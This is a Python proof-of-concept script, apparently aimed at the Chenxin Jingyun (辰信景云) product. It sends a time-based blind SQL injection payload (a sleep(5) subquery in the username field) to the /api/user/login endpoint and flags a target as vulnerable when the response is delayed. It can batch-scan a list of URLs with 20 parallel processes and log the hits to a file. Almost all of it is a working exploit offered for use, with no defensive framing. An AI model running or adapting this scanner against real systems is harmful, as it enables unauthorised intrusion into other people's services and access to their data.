import requests,argparse,time,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool

def banner():
    test = """
     ██████╗██╗  ██╗     ██╗██╗   ██╗    ██╗      ██████╗  ██████╗ ██╗███╗   ██╗
    ██╔════╝╚██╗██╔╝     ██║╚██╗ ██╔╝    ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
    ██║      ╚███╔╝      ██║ ╚████╔╝     ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
    ██║      ██╔██╗ ██   ██║  ╚██╔╝      ██║     ██║   ██║██║   ██║██║██║╚██╗██║
    ╚██████╗██╔╝ ██╗╚█████╔╝   ██║       ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝ ╚════╝    ╚═╝       ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝   
"""
    print(test)


def poc(target):
    payload= "/api/user/login"
    data2 = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"

    headers = {
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "X-Requested-With":"XMLHttpRequest"
    }
    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"http://127.0.0.1:8080"
    }
    try:
        res1 = requests.post(url=target+payload,data=data2,verify=False,headers=headers,timeout=15,proxies=proxies)
        res2 = requests.post(url=target,data=data2,verify=False,headers=headers,timeout=15)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1 - time2 >= 5 and time1 >5:
            print(f"[+]{target}存在延时注入漏洞")
            with open ("辰信_result.txt", "a", encoding="utf-8") as f:
                f.write(f"[+]{target}存在延时注入漏洞\n")

        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在漏洞，请手工测试")
def main():
    banner()
    parser =argparse.ArgumentParser(description="辰信景云sql注入")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")

if __name__=='__main__':
    main()